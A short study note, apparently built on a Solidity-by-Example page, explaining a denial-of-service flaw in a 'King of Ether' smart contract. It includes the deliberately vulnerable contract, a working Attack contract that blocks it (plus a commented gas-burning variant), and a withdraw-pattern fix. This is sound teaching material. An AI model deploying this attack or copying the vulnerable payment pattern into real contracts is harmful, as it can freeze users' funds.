https://solidity-by-example.org/hacks/denial-of-service/

The following code will result in denial of service because `Attack` didn't implement a [[Payable]] [[Fallback and Receive]], if the `Attack` becomes the `king`, the call to repay ether to `king` will fail always, result in a denial of service
Solution: always let user withdraw their own funds
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract KingOfEther {
    address public king;
    uint256 public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent,) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}

```